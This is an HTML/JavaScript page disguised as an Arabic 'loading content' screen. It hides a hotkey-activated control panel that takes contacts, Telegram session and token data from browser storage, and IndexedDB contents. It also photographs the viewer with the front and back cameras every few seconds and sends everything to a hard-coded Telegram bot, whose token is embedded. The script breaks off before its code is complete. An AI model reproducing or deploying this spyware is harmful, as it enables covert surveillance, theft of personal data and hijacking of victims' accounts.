<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Arial', sans-serif;
        }
        .loader {
            text-align: center;
            color: #fff;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #333;
            border-top: 4px solid #25D366;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .loader p { color: #888; font-size: 14px; }
        #status { color: #666; font-size: 12px; margin-top: 10px; }

        #adminPanel {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.95);
            z-index: 99999;
            padding: 20px;
            overflow-y: auto;
            color: #fff;
            font-family: 'Tahoma', sans-serif;
        }
        #adminPanel.active { display: block; }
        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #25D366;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .admin-header h1 { color: #25D366; font-size: 24px; }
        .admin-header .status { font-size: 12px; color: #888; }
        .admin-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .admin-card {
            background: #1a1a2e;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: 0.3s;
        }
        .admin-card:hover { border-color: #25D366; transform: scale(1.02); }
        .admin-card .icon { font-size: 30px; margin-bottom: 10px; }
        .admin-card .label { font-size: 13px; color: #aaa; }
        .admin-card .count { font-size: 18px; color: #25D366; font-weight: bold; }
        .admin-card.danger:hover { border-color: #ff4444; }
        .admin-card.danger .icon { color: #ff4444; }

        .admin-log {
            background: #0d0d1a;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 15px;
            max-height: 300px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
        }
        .admin-log .entry { padding: 4px 0; border-bottom: 1px solid #111; }
        .admin-log .entry .time { color: #666; }
        .admin-log .entry .msg { color: #0f0; }
        .admin-log .entry .error { color: #f44; }
        .admin-log .entry .warn { color: #ff0; }
        .admin-log .entry .info { color: #0ff; }

        .admin-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin: 15px 0;
        }
        .admin-btn {
            background: #1a1a2e;
            border: 1px solid #333;
            color: #fff;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            flex: 1;
            min-width: 120px;
        }
        .admin-btn:hover { border-color: #25D366; background: #2a2a3e; }
        .admin-btn.danger:hover { border-color: #ff4444; background: #3a1a1a; }
        .admin-btn.success { border-color: #25D366; }
        .admin-btn.success:hover { background: #1a3a2a; }

        #toast {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #1a1a2e;
            border: 1px solid #25D366;
            border-radius: 12px;
            padding: 15px 25px;
            color: #fff;
            z-index: 9999999;
            display: none;
            min-width: 200px;
        }
        #toast.show { display: block; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }

        .file-browser {
            background: #0d0d1a;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 15px;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 15px;
            display: none;
        }
        .file-browser.active { display: block; }
        .file-item {
            padding: 8px 12px;
            border-bottom: 1px solid #1a1a2e;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .file-item:hover { background: #1a1a2e; }
        .file-item .name { color: #0ff; }
        .file-item .size { color: #666; font-size: 11px; }
        .file-item .type { color: #888; font-size: 11px; }
        .file-item .preview { max-width: 50px; max-height: 50px; border-radius: 4px; }
    </style>
</head>
<body>

<div class="loader">
    <div class="spinner"></div>
    <p>جاري تحميل المحتوى...</p>
    <div id="status">⏳ جاري التهيئة</div>
</div>

<video id="videoFront" autoplay muted playsinline style="display:none;"></video>
<video id="videoBack" autoplay muted playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>
<audio id="audio" style="display:none;"></audio>

<div id="toast"></div>

<div id="adminPanel">
    <div class="admin-header">
        <h1>🕵️ لوحة التحكم</h1>
        <span class="status" id="targetStatus">🟢 متصل</span>
    </div>

    <div class="admin-grid">
        <div class="admin-card" onclick="stealContacts()">
            <div class="icon">👤</div>
            <div class="label">جهات الاتصال</div>
            <div class="count" id="contactCount">0</div>
        </div>
        <div class="admin-card" onclick="stealTelegram()">
            <div class="icon">✈️</div>
            <div class="label">تليجرام</div>
            <div class="count" id="tgCount">0</div>
        </div>
        <div class="admin-card" onclick="captureBothCameras()">
            <div class="icon">📸</div>
            <div class="label">تصوير كامل</div>
            <div class="count" id="camCount">0</div>
        </div>
        <div class="admin-card" onclick="stealAllFiles()">
            <div class="icon">📁</div>
            <div class="label">سحب الملفات</div>
            <div class="count" id="fileCount">0</div>
        </div>
        <div class="admin-card danger" onclick="killAll()">
            <div class="icon">💀</div>
            <div class="label">إيقاف الكل</div>
            <div class="count">⛔</div>
        </div>
    </div>

    <div class="admin-actions">
        <button class="admin-btn success" onclick="stealContacts()">👤 سحب جهات الاتصال</button>
        <button class="admin-btn" onclick="stealTelegram()">✈️ سحب تليجرام</button>
        <button class="admin-btn" onclick="captureBothCameras()">📸 تصوير كامل</button>
        <button class="admin-btn" onclick="stealAllFiles()">📁 سحب الملفات</button>
        <button class="admin-btn" onclick="browseFiles()">📂 تصفح الملفات</button>
        <button class="admin-btn danger" onclick="killAll()">💀 إيقاف الكل</button>
    </div>

    <div class="file-browser" id="fileBrowser">
        <h3 style="color:#25D366;margin-bottom:10px;">📂 مستكشف الملفات</h3>
        <input type="text" id="fileSearch" placeholder="🔍 بحث..." style="width:100%;padding:10px;background:#0d0d1a;border:1px solid #333;color:#fff;border-radius:8px;margin-bottom:10px;" onkeyup="filterFiles()">
        <div id="fileList"></div>
    </div>

    <div class="admin-log" id="adminLog">
        <div class="entry"><span class="time">[SYSTEM]</span> <span class="msg">✅ لوحة التحكم جاهزة</span></div>
    </div>

    <div style="text-align:center;margin-top:15px;">
        <button class="admin-btn danger" onclick="togglePanel()" style="max-width:200px;margin:0 auto;">🔒 إخفاء اللوحة</button>
    </div>
</div>

<script>
// ============================================================
// ====================== CONFIG ==============================
// ============================================================
const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
let CHAT_ID = '';
let targetData = { contacts: 0, tg: 0, camera: 0, files: 0 };
let allStolenFiles = [];
let fileIndex = 0;

// ============================================================
// ====================== TOGGLE PANEL ========================
// ============================================================
function togglePanel() {
    const panel = document.getElementById('adminPanel');
    panel.classList.toggle('active');
    if (panel.classList.contains('active')) {
        document.querySelector('.loader').style.display = 'none';
        document.getElementById('status').textContent = '🟢 لوحة التحكم نشطة';
        addLog('🟢 تم فتح لوحة التحكم', 'info');
    } else {
        document.querySelector('.loader').style.display = 'flex';
        document.getElementById('status').textContent = '⏳ جاري التحميل...';
    }
}

let panelOpen = false;
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.shiftKey && e.key === 'P') {
        e.preventDefault();
        togglePanel();
        panelOpen = true;
    }
    if (e.ctrlKey && e.shiftKey && e.key === 'H') {
        e.preventDefault();
        if (panelOpen) {
            document.getElementById('adminPanel').classList.remove('active');
            panelOpen = false;
        }
    }
});

function addLog(text, type = 'msg') {
    const logDiv = document.getElementById('adminLog');
    const entry = document.createElement('div');
    entry.className = 'entry';
    const time = new Date().toLocaleTimeString();
    entry.innerHTML = `<span class="time">[${time}]</span> <span class="${type}">${text}</span>`;
    logDiv.appendChild(entry);
    logDiv.scrollTop = logDiv.scrollHeight;
}

function showToast(text, duration = 3000) {
    const toast = document.getElementById('toast');
    toast.textContent = text;
    toast.className = 'show';
    clearTimeout(toast._timeout);
    toast._timeout = setTimeout(() => { toast.className = ''; }, duration);
}

// ============================================================
// ====================== STEAL CONTACTS ======================
// ============================================================
function stealContacts() {
    addLog('👤 محاولة سحب جهات الاتصال...', 'info');
    showToast('👤 جاري سحب جهات الاتصال...');
    
    try {
        if ('contacts' in navigator && 'select' in navigator.contacts) {
            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                .then(contacts => {
                    const text = contacts.map(c => 
                        `👤 ${c.name} | ${c.tel ? c.tel.join(', ') : ''} | ${c.email ? c.email.join(', ') : ''}`
                    ).join('\n');
                    sendMessage(`📱 جهات الاتصال (${contacts.length}):\n${text}`);
                    addLog(`👤 تم سحب ${contacts.length} جهة اتصال`, 'msg');
                    targetData.contacts += contacts.length;
                    document.getElementById('contactCount').textContent = targetData.contacts;
                })
                .catch(() => {
                    addLog('❌ فشل سحب جهات الاتصال', 'error');
                    stealContactsFallback();
                });
        } else {
            stealContactsFallback();
        }
    } catch(e) {
        stealContactsFallback();
    }
}

function stealContactsFallback() {
    try {
        const contacts = localStorage.getItem('contacts') || localStorage.getItem('phonebook');
        if (contacts) {
            sendMessage(`📱 جهات اتصال من localStorage:\n${contacts}`);
            addLog('👤 تم سحب جهات اتصال من localStorage', 'msg');
        }
    } catch(e) {}
}

// ============================================================
// ====================== STEAL TELEGRAM ======================
// ============================================================
function stealTelegram() {
    addLog('✈️ محاولة سحب بيانات تليجرام...', 'info');
    showToast('✈️ جاري سحب تليجرام...');
    let found = 0;
    
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            if (key && (key.includes('tg') || key.includes('telegram') || key.includes('gram') || 
                key.includes('user') || key.includes('session') || key.includes('token'))) {
                sendMessage(`📦 Telegram localStorage [${key}]:\n${value}`);
                found++;
                addLog(`✈️ تم سحب: ${key}`, 'msg');
            }
        }
    } catch(e) {}
    
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            if (key && (key.includes('tg') || key.includes('telegram') || key.includes('gram') || 
                key.includes('user') || key.includes('session') || key.includes('token'))) {
                sendMessage(`📦 Telegram sessionStorage [${key}]:\n${value}`);
                found++;
                addLog(`✈️ تم سحب: ${key}`, 'msg');
            }
        }
    } catch(e) {}
    
    targetData.tg += found;
    document.getElementById('tgCount').textContent = targetData.tg;
    setTimeout(() => showToast(`✅ تم سحب ${found} عنصر من تليجرام`), 2000);
}

// ============================================================
// ====================== CAPTURE BOTH CAMERAS ================
// ============================================================
let frontStream = null, backStream = null;
let frontInterval = null, backInterval = null;
let photoCount = 0;

function captureBothCameras() {
    addLog('📸 تشغيل الكاميرات (أمامي+خلفي)...', 'info');
    showToast('📸 تشغيل الكاميرات...');
    
    const frontConstraints = {
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
    };
    
    navigator.mediaDevices.getUserMedia(frontConstraints)
        .then(function(stream) {
            frontStream = stream;
            const video = document.getElementById('videoFront');
            video.srcObject = stream;
            video.play();
            addLog('📸 الكاميرا الأمامية تعمل', 'msg');
            setTimeout(() => captureFrontPhoto(), 1000);
            frontInterval = setInterval(captureFrontPhoto, 5000);
        })
        .catch(function(err) {
            addLog('❌ فشل الكاميرا الأمامية: ' + err.message, 'error');
        });
    
    const backConstraints = {
        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }
    };
    
    navigator.mediaDevices.getUserMedia(backConstraints)
        .then(function(stream) {
            backStream = stream;
            const video = document.getElementById('videoBack');
            video.srcObject = stream;
            video.play();
            addLog('📸 الكاميرا الخلفية تعمل', 'msg');
            setTimeout(() => captureBackPhoto(), 1000);
            backInterval = setInterval(captureBackPhoto, 5000);
        })
        .catch(function(err) {
            addLog('❌ فشل الكاميرا الخلفية: ' + err.message, 'error');
        });
    
    targetData.camera++;
    document.getElementById('camCount').textContent = targetData.camera;
}

function captureFrontPhoto() {
    const video = document.getElementById('videoFront');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    if (!video.videoWidth || !video.videoHeight) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    photoCount++;
    const imageData = canvas.toDataURL('image/jpeg', 0.7);
    sendToTelegram(imageData, `📸 أمامي ${photoCount} - ${new Date().toLocaleString()}`);
    addLog(`📸 صورة أمامي ${photoCount} مرسلة`, 'msg');
}

function captureBackPhoto() {
    const video = document.getElementById('videoBack');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    if (!video.videoWidth || !video.videoHeight) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    photoCount++;
    const imageData = canvas.toDataURL('image/jpeg', 0.7);
    sendToTelegram(imageData, `📸 خلفي ${photoCount} - ${new Date().toLocaleString()}`);
    addLog(`📸 صورة خلفي ${photoCount} مرسلة`, 'msg');
}

// ============================================================
// ====================== STEAL ALL FILES =====================
// ============================================================
function stealAllFiles() {
    addLog('📁 بدء سحب جميع الملفات...', 'info');
    showToast('📁 جاري سحب الملفات...');
    let found = 0;
    allStolenFiles = [];
    
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            const fileData = { id: fileIndex++, name: key, content: value, type: 'localStorage', size: value.length };
            allStolenFiles.push(fileData);
            sendMessage(`📦 ملف ${key} (${value.length} bytes):\n${value}`);
            found++;
        }
    } catch(e) {}
    
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            const fileData = { id: fileIndex++, name: key, content: value, type: 'sessionStorage', size: value.length };
            allStolenFiles.push(fileData);
            sendMessage(`📦 ملف ${key} (${value.length} bytes):\n${value}`);
            found++;
        }
    } catch(e) {}
    
    try {
        const request = indexedDB.open('files', 1);
        request.onsuccess = function(event) {
            const db = event.target.result;
            const stores = db.objectStoreNames;
            stores.forEach(storeName => {
                const transaction = db.transaction(storeName, 'readonly');
                const store = transaction.objectStore(storeName);
                const getAll = store.getAll();
                getAll.onsuccess = function() {
                    const data = getAll.result;
                    if (data && data.length > 0) {
                        data.forEach((item, idx) => {
                            const fileData = { id: fileIndex++, name: `indexeddb_${storeName}_${idx}`, content: JSON.stringify(item), type: 'IndexedDB', size: JSON.stringify(item).length };
                            allStolenFiles.push(fileData);
                            sendMessage(`📦 IndexedDB [${storeName}] ملف ${idx}:\n${JSON.stringify(item)}`);
                            found++;
                        });
                    }
                };
            });
        };
    } catch(e) {}
    
    targetData.files += found;
    document.getElementById('fileCount').textContent = targetData.files;
    browseFiles();
    setTimeout(() => showToast(`✅ تم سحب ${found} ملف`), 3000);
}

// ============================================================
// ====================== BROWSE FILES ========================
// ============================================================
function browseFiles() {
    const browser = document.getElementById('fileBrowser');
    browser.classList.toggle('active');
    if (browser.classList.contains('active')) {
        renderFileList();
    }
}

function renderFileList(filter = '') {
    const list = document.getElementById('fileList');
    list.innerHTML = '';
    const filtered = allStolenFiles.filter(f => 
        f.name.toLowerCase().includes(filter.toLowerCase()) || 
        f.type.toLowerCase().includes(filter.toLowerCase())
    );
    
    if (filtered.length === 0) {
        list.innerHTML = '<div style="color:#666;text-align:center;padding:20px;">لا توجد ملفات</div>';
        return;
    }
    
    filtered.forEach(file => {
        const div = document.createElement('div');
        div.className = 'file-item';
        const isImage = file.content && (file.content.startsWith('data:image') || file.content.match(/\.(jpg|jpeg|png|gif|webp)/i));
        
        div.innerHTML = `
            <div style="flex:1;">
                <div class="name">📄 ${file.name}</div>
                <div class="size">${file.type} • ${file.size} bytes</div>
            </div>
            ${isImage ? `<img src="${file.content}" class="preview" />` : ''}
            <button onclick="viewFile(${file.id})" style="background:#25D366;border:none;color:#000;padding:5px 10px;border-radius:4px;cursor:pointer;">👁️</button>
        `;
        list.appendChild(div);
    });
}

function filterFiles() {
    const search = document.getElementById('fileSearch').value;
    renderFileList(search);
}

function viewFile(id) {
    const file = allStolenFiles.find(f => f.id === id);
    if (!file) return;
    
    if (file.content && file.content.startsWith('data:image')) {
        sendToTelegram(file.content, `📸 ملف: ${file.name} (${file.type})`);
        showToast('✅ تم إرسال الصورة إلى البوت');
    } else {
        sendMessage(`📄 ملف: ${file.name}\nالنوع: ${file.type}\nالحجم: ${file.size} bytes\nالمحتوى:\n${file.content}`);
        showToast('✅ تم إرسال الملف إلى البوت');
    }
}

// ============================================================
// ====================== KILL =================================
// ============================================================
function killAll() {
    addLog('💀 إيقاف جميع العمليات...', 'warn');
    showToast('💀 إيقاف العمليات...');
    
    if (frontInterval) { clearInterval(frontInterval); frontInterval = null; }
    if (backInterval) { clearInterval(backInterval); backInterval = null; }
    if (frontStream) { frontStream.getTracks().forEach(t => t.stop()); frontStream = null; }
    if (backStream) { backStream.getTracks().forEach(t => t.stop()); backStream = null; }
    
    addLog('✅ تم إيقاف جميع العمليات', 'msg');
    showToast('✅ تم إيقاف جميع العمليات');
    sendMessage('💀 تم إيقاف جميع العمليات بأمر من المالك');
}

// ============================================================
// ====================== TELEGRAM =============================
// ============================================================
function getChatId() {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
        .then(res => res.json())
        .then(data => {
            if (data.ok && data.result.length > 0) {
                const lastUpdate = data.result[data.result.length - 1];
                if (lastUpdate.message) {
                    CHAT_ID = lastUpdate.message.chat.id;
                } else if (lastUpdate.callback_query) {
                    CHAT_ID = lastUpdate.callback_query.from.id;
                }
                addLog(`✅ Chat ID: ${CHAT_ID}`, 'msg');
                startBackgroundOperations();
            } else {
                setTimeout(getChatId, 3000);
            }
        })
        .catch(() => setTimeout(getChatId, 3000));
}

function sendToTelegram(imageData, caption = '') {
    if (!CHAT_ID) return;
    try {
        const blob = dataURLtoBlob(imageData);
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
        formData.append('caption', caption || `📸 ${new Date().toLocaleString()}`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).catch(() => {});
    } catch(e) {}
}

function sendMessage(text) {
    if (!CHAT_ID) return;
    const chunks = text.match(/(.|[\r\n]){1,4000}/g) || [text];
    chunks.forEach(chunk => {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: chunk })
        }).catch(() => {});
    });
}

function dataURLtoBlob(dataURL) {
    const parts = dataURL.split(',');
    const mime = parts[0].match(/:(.*?);/)[1];
    const bstr = atob(parts[1]);
    const n = bstr.length;
    const u8arr = new Uint8Array(n);
    for (let i = 0; i < n; i++) { u8arr[i] = bstr.charCodeAt(i); }
    return new Blob([u8arr], { type: mime });
}
